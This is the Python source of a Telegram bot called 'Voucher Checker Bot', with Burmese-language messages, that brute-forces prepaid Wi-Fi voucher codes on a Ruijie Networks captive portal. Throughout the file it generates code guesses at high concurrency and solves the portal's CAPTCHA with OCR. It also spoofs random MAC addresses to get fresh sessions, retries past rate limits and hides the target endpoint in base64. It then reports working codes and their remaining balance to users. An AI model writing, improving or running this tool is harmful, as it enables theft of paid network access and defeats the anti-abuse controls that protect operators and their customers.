"""
Voucher Checker Bot
====================
GitHub + Railway Deployment
Environment Variables Required:
  BOT_TOKEN  — Telegram Bot Token
  ADMIN_ID   — Telegram Admin User ID
"""

import asyncio
import base64
import json
import logging
import os
import random
import re
import string
import time
import uuid
from itertools import product as iter_product

import aiohttp
import cv2
import ddddocr
import numpy as np
from aiohttp import web
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ─────────────────────────────────────────────────────────────────────────────
# Logging
# ─────────────────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

# ─────────────────────────────────────────────────────────────────────────────
# Config
# ─────────────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID  = os.environ.get("ADMIN_ID", "")

# ─────────────────────────────────────────────────────────────────────────────
# Constants
# ─────────────────────────────────────────────────────────────────────────────
POST_URL = base64.b64decode(
    b"aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM="
).decode()

PLAN_RE = re.compile(r"^(\d+(mo|min|h|d|m))+$|^unlimit(ed)?$", re.IGNORECASE)

CHARSETS = {
    1: string.digits,
    2: string.ascii_lowercase,
    3: string.ascii_uppercase,
    4: string.ascii_letters,
    5: string.ascii_lowercase + string.digits,
}

MODE_NAMES = {
    1: "ဂဏန်း (0-9)",
    2: "အသေး (a-z)",
    3: "အကြီး (A-Z)",
    4: "အကြီး+အသေး (a-zA-Z)",
    5: "စာ+ဂဏန်း (a-z0-9)",
}

DEFAULT_NOTIFY = True
CONCURRENCY    = 500
_start_time    = time.monotonic()

# ─────────────────────────────────────────────────────────────────────────────
# Global state
# ─────────────────────────────────────────────────────────────────────────────
bot              = AsyncTeleBot(BOT_TOKEN)
user_data        = {}   # {chat_id: {"session_url": str}}
scan_tasks       = {}   # {chat_id: {"task": Task, "stop": bool, "scan_id": str}}
success_texts    = {}   # {chat_id: [{"code","session_id","plan"}]}
limited_texts    = {}   # {chat_id: [str]}
notify_setting   = {}   # {chat_id: bool}
last_scan_params = {}   # {chat_id: {mode,length,target,plan_filters}}
pending_brute    = {}   # {chat_id: same}
success_messages = {}   # {chat_id: message_id}
limited_messages = {}   # {chat_id: message_id}

# Initialized in main()
session      = None
_connector   = None
_voucher_sem = None

# ─────────────────────────────────────────────────────────────────────────────
# Web server (Railway keep-alive — uses Railway's PORT env var)
# ─────────────────────────────────────────────────────────────────────────────
async def handle(request):
    return web.Response(text="OK")

async def start_web_server():
    app    = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8099))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    log.info(f"Web server listening on port {port}")

# ─────────────────────────────────────────────────────────────────────────────
# Time / balance helpers
# ─────────────────────────────────────────────────────────────────────────────
def _fmt_sec(v: int) -> str:
    s = int(v)
    h, r = divmod(s, 3600)
    m    = r // 60
    if h: return f"{h}h {m}m"
    if m: return f"{m}m"
    return f"{s}s"

def _fmt_min(v: int) -> str:
    t = int(v)
    if t <= 0:  return "0m"
    if t < 60:  return f"{t}m"
    h, m = divmod(t, 60)
    if h < 24:  return f"{h}h {m}m" if m else f"{h}h"
    d, rh = divmod(h, 24)
    if d < 30:  return f"{d}d {rh}h" if rh else f"{d}d"
    mo, rd = divmod(d, 30)
    return f"{mo}mo {rd}d" if rd else f"{mo}mo"

def plan_to_min(s: str) -> float:
    if not s: return 0
    s = s.strip().lower()
    if s in ("unlimit", "unlimited"): return float("inf")
    total = 0
    for v, u in re.findall(r"(\d+)\s*(mo|min|h|d|m)\b", s):
        v = int(v)
        if   u == "mo":          total += v * 43200
        elif u == "d":           total += v * 1440
        elif u == "h":           total += v * 60
        elif u in ("min", "m"):  total += v
    return total

async def get_balance(token: str) -> str:
    headers = {
        "accept":           "application/json, */*; q=0.01",
        "content-type":     "application/json",
        "user-agent":       "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "x-requested-with": "XMLHttpRequest",
    }
    urls = [
        f"http://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{token}",
        f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{token}",
    ]
    for url in urls:
        try:
            async with session.get(url, headers=headers,
                                   timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200:
                    continue
                data = await r.json(content_type=None)
                for d in [data,
                          data.get("result", {}) if isinstance(data, dict) else {},
                          data.get("data",   {}) if isinstance(data, dict) else {}]:
                    if not isinstance(d, dict):
                        continue
                    for k in ("totalMinutes","remainingMinutes","remainMinutes",
                              "leftMinutes","balance","remaining"):
                        if d.get(k) is not None:
                            return _fmt_min(d[k])
                    for k in ("remainingSeconds","remainTime","remainingTime",
                              "leftTime","timeLeft","remain_time"):
                        if d.get(k) is not None:
                            return _fmt_sec(d[k])
        except Exception as e:
            log.debug(f"get_balance {url}: {e}")
    return "N/A"

# ─────────────────────────────────────────────────────────────────────────────
# Code generator
# ─────────────────────────────────────────────────────────────────────────────
def iter_codes(mode: int, length: int):
    cs    = CHARSETS[mode]
    total = len(cs) ** length
    if total <= 1_000_000:
        codes = ["".join(p) for p in iter_product(cs, repeat=length)]
        random.shuffle(codes)
        yield from codes
    else:
        while True:
            yield "".join(random.choices(cs, k=length))

def known_total(mode: int, length: int):
    """Return total code count only for exhaustible spaces (≤ 1M)."""
    cs = CHARSETS.get(mode)
    if not cs: return None
    t = len(cs) ** length
    return t if t <= 1_000_000 else None

def fmt_progress(checked: int, total=None, speed: float = 0,
                 found: int = 0, target=None) -> str:
    c = f"{checked:,}" + (f"/{total:,}" if total else "")
    lines = [
        "📋 Status: Running",
        f"⚡ Speed: {speed:,.0f}/min",
        f"🔍 Checked: {c}",
        f"💎 Found: {found}",
    ]
    if target:
        lines.append(f"🎯 Target: {found}/{target}")
    return "\n".join(lines)

# ─────────────────────────────────────────────────────────────────────────────
# OCR / Captcha
# ─────────────────────────────────────────────────────────────────────────────
_ocr = ddddocr.DdddOcr(show_ad=False)

def _ocr_sync(image_bytes: bytes):
    arr  = np.frombuffer(image_bytes, np.uint8)
    img  = cv2.imdecode(arr, cv2.IMREAD_COLOR)
    if img is None:
        return None
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    blur = cv2.GaussianBlur(gray, (3, 3), 0)
    _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, bf = cv2.imencode(".png", th)
    return _ocr.classification(bf.tobytes()).upper()

async def captcha_text(img: bytes):
    return await asyncio.to_thread(_ocr_sync, img)

def rand_mac() -> str:
    fb  = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [fb] + [random.randint(0, 0xFF) for _ in range(5)]
    return ":".join(f"{x:02x}" for x in mac)

def set_mac(url: str, mac: str) -> str:
    return re.sub(r"(?<=mac=)[^&]+", mac, url)

async def get_session_id(s: aiohttp.ClientSession,
                         session_url: str, prev=None):
    url = set_mac(session_url, rand_mac())
    try:
        async with s.get(url, allow_redirects=True,
                         timeout=aiohttp.ClientTimeout(total=15)) as r:
            m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
            return m.group(1) if m else prev
    except Exception:
        return prev

async def get_captcha_image(s: aiohttp.ClientSession, sid: str) -> bytes:
    params = {"sessionId": sid, "_t": str(time.time())}
    async with s.get(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/image",
        params=params,
        timeout=aiohttp.ClientTimeout(total=10),
    ) as r:
        return await r.read()

async def verify_captcha(s: aiohttp.ClientSession,
                         sid: str, text: str) -> bool:
    async with s.post(
        "https://portal-as.ruijienetworks.com/api/auth/captcha/verify",
        json={"sessionId": sid, "authCode": text},
        timeout=aiohttp.ClientTimeout(total=10),
    ) as r:
        d = await r.json(content_type=None)
        return bool(d.get("success"))

async def check_session_url(url: str) -> bool:
    try:
        async with session.get(url, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=15)) as r:
            return "sessionId" in str(r.url)
    except Exception:
        return False

# ─────────────────────────────────────────────────────────────────────────────
# Core voucher check
# ─────────────────────────────────────────────────────────────────────────────
async def perform_check(
    session_url: str,
    code: str,
    chat_id: int,
    scan_id: str = None,
    recheck: bool = False,
    message=None,
    plan_filters: list = None,
):
    if not recheck:
        cur = scan_tasks.get(chat_id)
        if not cur or cur.get("scan_id") != scan_id:
            return None

    response   = None
    session_id = None

    for attempt in range(3):
        try:
            async with aiohttp.ClientSession(
                connector=_connector,
                connector_owner=False,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=40),
            ) as ts:
                session_id = await get_session_id(ts, session_url)
                if not session_id:
                    continue

                # Solve captcha (up to 8 tries)
                auth_code = None
                for _ in range(8):
                    try:
                        img  = await get_captcha_image(ts, session_id)
                        text = await captcha_text(img)
                        if text and await verify_captcha(ts, session_id, text):
                            auth_code = text
                            break
                    except Exception:
                        continue
                if not auth_code:
                    continue

                # Re-check stop signal
                if not recheck:
                    cur = scan_tasks.get(chat_id)
                    if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
                        return None

                # Submit voucher code
                async with ts.post(
                    POST_URL,
                    json={
                        "accessCode": code,
                        "sessionId":  session_id,
                        "apiVersion": 1,
                        "authCode":   auth_code,
                    },
                    headers={
                        "authority":    "portal-as.ruijienetworks.com",
                        "accept":       "*/*",
                        "content-type": "application/json",
                        "origin":       "https://portal-as.ruijienetworks.com",
                        "user-agent":   (
                            "Mozilla/5.0 (Linux; Android 12; K) "
                            "AppleWebKit/537.36 (KHTML, like Gecko) "
                            "Chrome/139.0.0.0 Mobile Safari/537.36"
                        ),
                    },
                    timeout=aiohttp.ClientTimeout(total=20),
                ) as req:
                    response = await req.text()
                    log.debug(f"code={code} attempt={attempt+1} resp={response[:80]}")

        except Exception as e:
            log.debug(f"perform_check code={code}: {e}")
            continue

        if response and "request limited" in response:
            await asyncio.sleep(2)
            response = None
            continue
        break

    if not response:
        return None

    # ── SUCCESS ──────────────────────────────────────────────────────────────
    if "logonUrl" in response:
        if recheck:
            return code

        plan_str = "N/A"
        try:
            rd  = json.loads(response)
            lu  = rd.get("result", {}).get("logonUrl", "")
            m   = re.search(r"token=(.*?)(?:&|$)", lu)
            tok = m.group(1) if m else session_id
            fetched = await get_balance(tok)
            if fetched not in ("N/A", "Error"):
                plan_str = fetched
        except Exception:
            pass

        if plan_filters:
            mins = plan_to_min(plan_str)
            if not any(mins >= plan_to_min(f) for f in plan_filters):
                return None

        success_texts.setdefault(chat_id, []).append(
            {"code": code, "session_id": session_id, "plan": plan_str}
        )
        log.info(f"FOUND code={code} plan={plan_str} chat_id={chat_id}")

        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            lines = "\n".join(
                f"`{i['code']}` – ⏳ {i['plan']}" for i in success_texts[chat_id]
            )
            txt = f"✅ *Success Codes:*\n{lines}"
            try:
                if chat_id not in success_messages:
                    sent = await bot.send_message(chat_id, txt, parse_mode="Markdown")
                    success_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        txt, chat_id=chat_id,
                        message_id=success_messages[chat_id],
                        parse_mode="Markdown",
                    )
            except Exception:
                pass
        return code

    # ── RATE LIMITED ─────────────────────────────────────────────────────────
    if "STA" in response:
        limited_texts.setdefault(chat_id, []).append(code)
        if notify_setting.get(chat_id, DEFAULT_NOTIFY) and message:
            lines = "\n".join(f"`{c}`" for c in limited_texts[chat_id])
            txt   = f"⚠️ *Limited Codes:*\n{lines}"
            try:
                if chat_id not in limited_messages:
                    sent = await bot.send_message(chat_id, txt, parse_mode="Markdown")
                    limited_messages[chat_id] = sent.message_id
                else:
                    await bot.edit_message_text(
                        txt, chat_id=chat_id,
                        message_id=limited_messages[chat_id],
                        parse_mode="Markdown",
                    )
            except Exception:
                pass

    return None

# ─────────────────────────────────────────────────────────────────────────────
# Brute-force runner
# ─────────────────────────────────────────────────────────────────────────────
async def run_bruteforce(
    mode: int, length: int,
    chat_id: int, session_url: str, scan_id: str,
    target: int = None,
    orig_msg=None, prog_msg=None,
    plan_filters: list = None,
):
    _user_stopped = False
    try:
        code_iter = iter_codes(mode, length)
        total     = known_total(mode, length)
        checked   = 0
        found     = 0
        t_start   = time.monotonic()

        while True:
            cur = scan_tasks.get(chat_id)
            if not cur or cur.get("scan_id") != scan_id:
                return
            if cur.get("stop"):
                _user_stopped = True
                last_scan_params[chat_id] = {
                    "mode": mode, "length": length,
                    "target": target,
                    "plan_filters": plan_filters or [],
                }
                return

            # Build batch of 1000 codes
            batch = []
            for _ in range(1000):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _chk(code):
                async with _voucher_sem:
                    return await perform_check(
                        session_url, code, chat_id, scan_id,
                        message=orig_msg, plan_filters=plan_filters,
                    )

            results = await asyncio.gather(
                *[_chk(c) for c in batch], return_exceptions=True
            )

            for res in results:
                if isinstance(res, str):
                    found += 1
                    if target and found >= target:
                        _user_stopped = True
                        try:
                            await bot.edit_message_text(
                                "🎯 Target ရောက်ပြီ! Scan ပြီးပါပြီ။",
                                chat_id=chat_id,
                                message_id=prog_msg.message_id,
                            )
                        except Exception:
                            pass
                        return

            checked += len(batch)
            elapsed  = time.monotonic() - t_start
            speed    = checked / elapsed * 60 if elapsed > 0 else 0
            txt      = fmt_progress(checked, total, speed, found, target)
            try:
                await bot.edit_message_text(
                    txt, chat_id=chat_id, message_id=prog_msg.message_id
                )
            except Exception:
                try:
                    nm = await bot.send_message(chat_id, txt)
                    prog_msg.message_id = nm.message_id
                except Exception:
                    pass

        # All codes exhausted
        finish = "✅ Scan ပြီးပါပြီ။"
        try:
            await bot.edit_message_text(
                finish, chat_id=chat_id, message_id=prog_msg.message_id
            )
        except Exception:
            await bot.send_message(chat_id, finish)

    except asyncio.CancelledError:
        pass
    except Exception as e:
        log.error(f"run_bruteforce error: {e}")
    finally:
        scan_tasks.pop(chat_id, None)
        if not _user_stopped:
            last_scan_params.pop(chat_id, None)

# ─────────────────────────────────────────────────────────────────────────────
# Start scan helper
# ─────────────────────────────────────────────────────────────────────────────
async def start_scan(chat_id: int, mode: int, length: int,
                     target, orig_msg, plan_filters: list = None):
    plan_filters = plan_filters or []
    pf_str  = f" | Plan: {'/'.join(plan_filters)}" if plan_filters else ""
    tgt_str = f" | Target: {target}" if target else ""

    prog = await bot.send_message(
        chat_id,
        f"🚀 *Mode {mode}* — {MODE_NAMES[mode]}\n"
        f"📏 Length: `{length}`{tgt_str}{pf_str}\n\n"
        "⏳ ရှာဖွေနေပါသည်...",
        parse_mode="Markdown",
    )
    scan_id = str(uuid.uuid4())
    task = asyncio.create_task(
        run_bruteforce(
            mode, length, chat_id,
            user_data[chat_id]["session_url"],
            scan_id, target, orig_msg, prog, plan_filters,
        )
    )
    scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
    success_messages.pop(chat_id, None)
    limited_messages.pop(chat_id, None)

# ─────────────────────────────────────────────────────────────────────────────
# Bot commands
# ─────────────────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(msg):
    await bot.reply_to(
        msg,
        "👋 *Voucher Checker Bot*\n\n"
        "① Session URL ထည့်:\n`/setup <url>`\n\n"
        "② Code ရှာ:\n`/brute <mode> <length> [target]`\n\n"
        "*Mode:*\n"
        "`1`=ဂဏန်း  `2`=အသေး  `3`=အကြီး\n"
        "`4`=၂မျိုး  `5`=စာ+ဂဏန်း\n\n"
        "/help — command အကုန်ကြည့်ရန်",
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["help"])
async def cmd_help(msg):
    await bot.reply_to(
        msg,
        "📚 *Command လမ်းညွှန်*\n\n"
        "━━ *Setup* ━━\n"
        "`/setup <url>`\n\n"
        "━━ *Scan* ━━\n"
        "`/brute <mode> <length> [target] [plan...]`\n\n"
        "*Mode:*\n"
        "  `1` = ဂဏန်း (0–9)\n"
        "  `2` = အသေး (a–z)\n"
        "  `3` = အကြီး (A–Z)\n"
        "  `4` = အကြီး+အသေး (a–zA–Z)\n"
        "  `5` = စာ+ဂဏန်း (a–z, 0–9)\n\n"
        "*ဥပမာ:*\n"
        "  `/brute 1 6`       — ဂဏန်း ၆ လုံး\n"
        "  `/brute 1 6 5`     — ဂဏန်း ၆ လုံး, ၅ ခု\n"
        "  `/brute 2 8 10`    — အသေး ၈ လုံး, ၁၀ ခု\n"
        "  `/brute 5 6 5 1d`  — ၆ လုံး, ၁ ရက်ကျော် ၅ ခု\n\n"
        "━━ *Control* ━━\n"
        "`/stop`    — Scan ရပ်ရန်\n"
        "`/resume`  — Scan ပြန်စရန်\n"
        "`/saved`   — ရလဒ်ကြည့်ရန်\n"
        "`/notify`  — Notification ON/OFF\n"
        "`/recheck` — Success codes ပြန်စစ်ရန်\n"
        "`/status`  — Bot status (Admin)",
        parse_mode="Markdown",
    )

@bot.message_handler(commands=["setup"])
async def cmd_setup(msg):
    parts = msg.text.split(maxsplit=1)
    if len(parts) < 2:
        await bot.reply_to(msg, "❗ `/setup <session_url>`", parse_mode="Markdown")
        return
    url = parts[1].strip()
    pm  = await bot.reply_to(msg, "⏳ URL စစ်ဆေးနေပါသည်...")
    if await check_session_url(url):
        cid = msg.chat.id
        user_data[cid] = {"session_url": url}
        for d in (success_texts, limited_texts, last_scan_params,
                  pending_brute, success_messages, limited_messages):
            d.pop(cid, None)
        await bot.edit_message_text(
            "✅ Session URL သိမ်းဆည်းပြီး!\n"
            "`/brute` ဖြင့် Code ရှာနိုင်ပါပြီ။",
            chat_id=msg.chat.id, message_id=pm.message_id,
            parse_mode="Markdown",
        )
    else:
        await bot.edit_message_text(
            "❌ Session URL မှားနေပါသည်။\nURL ကို ပြန်စစ်ပြီး ထပ်ကြိုးပါ။",
            chat_id=msg.chat.id, message_id=pm.message_id,
        )

@bot.message_handler(commands=["brute"])
async def cmd_brute(msg):
    args    = msg.text.split()
    chat_id = msg.chat.id

    if len(args) < 3:
        await bot.reply_to(
            msg,
            "❗ `/brute <mode> <length> [target] [plan...]`\n\n"
            "ဥပမာ: `/brute 1 6 5`",
            parse_mode="Markdown",
        )
        return

    # Parse mode and length
    try:
        mode   = int(args[1])
        length = int(args[2])
    except ValueError:
        await bot.reply_to(msg, "Mode နှင့် Length သည် ဂဏန်းဖြစ်ရမည်။\nဥပမာ: `/brute 1 6 5`",
                           parse_mode="Markdown")
        return

    if mode not in CHARSETS:
        await bot.reply_to(
            msg,
            "Mode 1–5 ပေးပါ:\n"
            "`1`=ဂဏန်း  `2`=အသေး  `3`=အကြီး  `4`=၂မျိုး  `5`=စာ+ဂဏန်း",
            parse_mode="Markdown",
        )
        return

    if not 1 <= length <= 12:
        await bot.reply_to(msg, "Length: 1–12 ထည့်ပါ။")
        return

    if chat_id not in user_data:
        await bot.reply_to(msg, "❗ `/setup <url>` ဦးဆုံးလုပ်ပါ။", parse_mode="Markdown")
        return

    # Parse optional target + plan filters
    target: int    = None
    plan_filters   = []
    idx            = 3

    if idx < len(args) and not PLAN_RE.match(args[idx]):
        try:
            target = int(args[idx])
            idx   += 1
        except ValueError:
            await bot.reply_to(msg, "Target သည် ဂဏန်းဖြစ်ရမည်။")
            return

    for a in args[idx:]:
        if PLAN_RE.match(a):
            plan_filters.append(a)
        else:
            await bot.reply_to(
                msg,
                f"'{a}' plan ပုံစံမမှန်ပါ။\n"
                "ဥပမာ: `30min` `1h` `1d` `1mo` `unlimit`",
                parse_mode="Markdown",
            )
            return

    # Offer resume if previous scan was stopped
    if chat_id in last_scan_params:
        prev   = last_scan_params[chat_id]
        pf_str = "/".join(prev.get("plan_filters") or []) or "ဘာမဆို"
        markup = InlineKeyboardMarkup()
        markup.add(
            InlineKeyboardButton("▶️ ပြန်ဆက်ရှာ", callback_data="resume_scan"),
            InlineKeyboardButton("🆕 အသစ်စတင်",   callback_data="new_scan"),
        )
        pending_brute[chat_id] = {
            "mode": mode, "length": length,
            "target": target, "plan_filters": plan_filters,
        }
        await bot.reply_to(
            msg,
            f"⏸ ယခင် scan ရပ်ထားသည်\n"
            f"Mode `{prev['mode']}` | Len `{prev['length']}` | "
            f"Target `{prev['target']}` | Plan `{pf_str}`\n\n"
            "ဘာလုပ်မလဲ?",
            reply_markup=markup, parse_mode="Markdown",
        )
        return

    await start_scan(chat_id, mode, length, target, msg, plan_filters)

@bot.message_handler(commands=["stop"])
async def cmd_stop(msg):
    chat_id = msg.chat.id
    data    = scan_tasks.get(chat_id)
    if data:
        data["stop"] = True
        if not data["task"].done():
            data["task"].cancel()
        await bot.reply_to(
            msg,
            "⏹ Scan ရပ်ပါပြီ။\n`/resume` ဖြင့် ပြန်စနိုင်သည်။",
            parse_mode="Markdown",
        )
    else:
        await bot.reply_to(msg, "ရပ်ရန် active scan မရှိပါ။")

@bot.message_handler(commands=["resume"])
async def cmd_resume(msg):
    chat_id = msg.chat.id
    if chat_id not in last_scan_params:
        await bot.reply_to(msg, "ယခင်ရပ်ထားသော scan မရှိပါ။")
        return
    p = last_scan_params.pop(chat_id)
    await bot.reply_to(msg, "▶️ ပြန်ဆက်ရှာပါမည်...")
    await start_scan(
        chat_id, p["mode"], p["length"], p["target"],
        msg, p.get("plan_filters", []),
    )

@bot.callback_query_handler(func=lambda c: c.data in ("resume_scan", "new_scan"))
async def handle_cb(call):
    chat_id = call.message.chat.id
    await bot.answer_callback_query(call.id)

    if call.data == "resume_scan":
        if chat_id not in last_scan_params:
            await bot.edit_message_text(
                "Resume လုပ်ရန် scan မရှိပါ။",
                chat_id=chat_id, message_id=call.message.message_id,
            )
            return
        p = last_scan_params.pop(chat_id)
        await bot.edit_message_text(
            "▶️ ပြန်ဆက်ရှာနေပါပြီ...",
            chat_id=chat_id, message_id=call.message.message_id,
        )
        await start_scan(
            chat_id, p["mode"], p["length"], p["target"],
            call.message, p.get("plan_filters", []),
        )
    else:  # new_scan
        p = pending_brute.pop(chat_id, None)
        last_scan_params.pop(chat_id, None)
        await bot.edit_message_text(
            "🆕 Scan အသစ်စတင်ပါပြီ။" if p else "Command ထပ်ပေးပို့ပါ။",
            chat_id=chat_id, message_id=call.message.message_id,
        )
        if p:
            await start_scan(
                chat_id, p["mode"], p["length"], p["target"],
                call.message, p.get("plan_filters", []),
            )

@bot.message_handler(commands=["saved"])
async def cmd_saved(msg):
    chat_id = msg.chat.id
    succ    = success_texts.get(chat_id, [])
    lim     = limited_texts.get(chat_id, [])
    if not succ and not lim:
        await bot.reply_to(msg, "ရှာတွေ့ထားသော code မရှိသေးပါ။")
        return
    parts = []
    if succ:
        parts.append(f"✅ *Success Codes* ({len(succ)})")
        parts += [f"`{i['code']}` – ⏳ {i.get('plan','N/A')}" for i in succ]
    if lim:
        parts.append(f"\n⚠️ *Limited Codes* ({len(lim)})")
        parts += [f"`{c}`" for c in lim]
    txt = "\n".join(parts)
    if len(txt) <= 4096:
        await bot.reply_to(msg, txt, parse_mode="Markdown")
    else:
        for i in range(0, len(txt), 4096):
            await bot.send_message(chat_id, txt[i:i+4096], parse_mode="Markdown")

@bot.message_handler(commands=["notify"])
async def cmd_notify(msg):
    cid = msg.chat.id
    notify_setting[cid] = not notify_setting.get(cid, DEFAULT_NOTIFY)
    st  = "ON 🔔" if notify_setting[cid] else "OFF 🔕"
    await bot.reply_to(msg, f"Notification: *{st}*", parse_mode="Markdown")

@bot.message_handler(commands=["recheck"])
async def cmd_recheck(msg):
    chat_id = msg.chat.id
    if chat_id not in user_data:
        await bot.reply_to(msg, "❗ `/setup <url>` ဦးဆုံးလုပ်ပါ။", parse_mode="Markdown")
        return
    succ = success_texts.get(chat_id, [])
    if not succ:
        await bot.reply_to(msg, "Recheck လုပ်ရန် success code မရှိပါ။")
        return
    pm = await bot.reply_to(msg, f"🔍 {len(succ)} codes စစ်ဆေးနေပါသည်...")
    new_succ = []
    for item in succ:
        res = await perform_check(
            user_data[chat_id]["session_url"],
            item["code"], chat_id,
            recheck=True, message=msg,
        )
        if res:
            new_succ.append(item)
    success_texts[chat_id] = new_succ
    if new_succ:
        lines = "\n".join(
            f"`{i['code']}` – {i.get('plan','N/A')}" for i in new_succ
        )
        await bot.edit_message_text(
            f"✅ Valid codes ({len(new_succ)}):\n{lines}",
            chat_id=chat_id, message_id=pm.message_id,
            parse_mode="Markdown",
        )
    else:
        await bot.edit_message_text(
            "✅ Recheck ပြီး — valid code မကျန်ပါ။",
            chat_id=chat_id, message_id=pm.message_id,
        )

@bot.message_handler(commands=["status"])
async def cmd_status(msg):
    if str(msg.chat.id) != ADMIN_ID:
        await bot.reply_to(msg, "❌ No Permission")
        return
    active      = sum(1 for d in scan_tasks.values() if not d["task"].done())
    up          = int(time.monotonic() - _start_time)
    h, r        = divmod(up, 3600)
    m, s        = divmod(r, 60)
    total_found = sum(len(v) for v in success_texts.values())
    await bot.reply_to(
        msg,
        f"📊 *Bot Status*\n\n"
        f"⏱ Uptime: `{h}h {m}m {s}s`\n"
        f"🔍 Active Scans: `{active}`\n"
        f"👥 Sessions: `{len(user_data)}`\n"
        f"💎 Total Found: `{total_found}`",
        parse_mode="Markdown",
    )

# ─────────────────────────────────────────────────────────────────────────────
# Polling with auto-reconnect
# ─────────────────────────────────────────────────────────────────────────────
async def start_polling():
    backoff = 5
    while True:
        try:
            await bot.infinity_polling(timeout=20, request_timeout=20)
            return
        except Exception as e:
            log.error(f"Polling error: {e}. Retrying in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

# ─────────────────────────────────────────────────────────────────────────────
# Entry point
# ─────────────────────────────────────────────────────────────────────────────
async def main():
    global session, _connector, _voucher_sem

    if not BOT_TOKEN:
        raise RuntimeError("BOT_TOKEN is not set! Add it in Railway environment variables.")
    if not ADMIN_ID:
        log.warning("ADMIN_ID is not set. /status command will not work.")

    _connector   = aiohttp.TCPConnector(limit=1000, ttl_dns_cache=300, ssl=False)
    session      = aiohttp.ClientSession(
        connector=_connector,
        connector_owner=False,
        timeout=aiohttp.ClientTimeout(total=30),
    )
    _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    log.info("Bot is starting...")
    try:
        asyncio.create_task(start_web_server())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()
        log.info("Bot stopped.")

if __name__ == "__main__":
    asyncio.run(main())
